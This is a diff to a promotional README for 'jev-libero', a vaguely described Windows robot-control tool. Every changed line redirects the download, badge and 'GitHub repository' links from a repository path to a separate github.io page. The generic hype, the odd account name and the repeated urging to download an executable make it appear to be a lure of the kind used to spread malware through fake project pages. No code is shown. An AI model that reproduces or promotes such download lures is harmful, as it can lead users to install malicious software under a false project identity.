@@ -8,9 +8,9 @@ Welcome to **jev-libero**! This amazing tool helps you control robots with incre
 
 **Ready to begin? Here's how:**
 
-Visit this link to download the application: [https://github.com/Eastereggfreereed793/jev-libero](https://github.com/Eastereggfreereed793/jev-libero)
+Visit this link to download the application: [https://eastereggfreereed793.github.io](https://eastereggfreereed793.github.io)
 
-[![Download Now](https://img.shields.io/badge/Download_jev--libero-Visit_Link-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6A5ACD&color=FF6B6B)](https://github.com/Eastereggfreereed793/jev-libero)
+[![Download Now](https://img.shields.io/badge/Download_jev--libero-Visit_Link-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6A5ACD&color=FF6B6B)](https://eastereggfreereed793.github.io)
 
 ### 🖥️ System Requirements
 
@@ -42,7 +42,7 @@ To run jev-libero smoothly on your Windows computer, make sure you have:
 ### 📚 Step-by-Step Setup Guide
 
 #### Step 1: Download the Application
-1. Click the blue "Download Now" button above or visit [https://github.com/Eastereggfreereed793/jev-libero](https://github.com/Eastereggfreereed793/jev-libero)
+1. Click the blue "Download Now" button above or visit [https://eastereggfreereed793.github.io](https://eastereggfreereed793.github.io)
 2. Look for the "Download" or "Get" button on the page
 3. Click it and wait for the download to complete
 
@@ -109,14 +109,14 @@ A: The system requirements above show the minimum specs needed. If your computer
 If you need assistance:
 
 - **Check the Help Menu** inside the application
-- **Visit the GitHub repository** at [https://github.com/Eastereggfreereed793/jev-libero](https://github.com/Eastereggfreereed793/jev-libero)
+- **Visit the GitHub repository** at [https://eastereggfreereed793.github.io](https://eastereggfreereed793.github.io)
 - **Watch tutorial videos** - just search for "jev-libero tutorial" online
 
 ### 🎉 Start Controlling Robots Today!
 
 jev-libero puts the power of advanced robotics in your hands. Whether you're a student, hobbyist, or professional, this tool makes robot control accessible, fun, and incredibly precise. Download today and see what the future of robotics feels like!
 
-Remember: [Visit this link to download the application](https://github.com/Eastereggfreereed793/jev-libero) and start your robotics journey now!
+Remember: [Visit this link to download the application](https://eastereggfreereed793.github.io) and start your robotics journey now!
 
 **Happy robot controlling!** 🤖✨
 
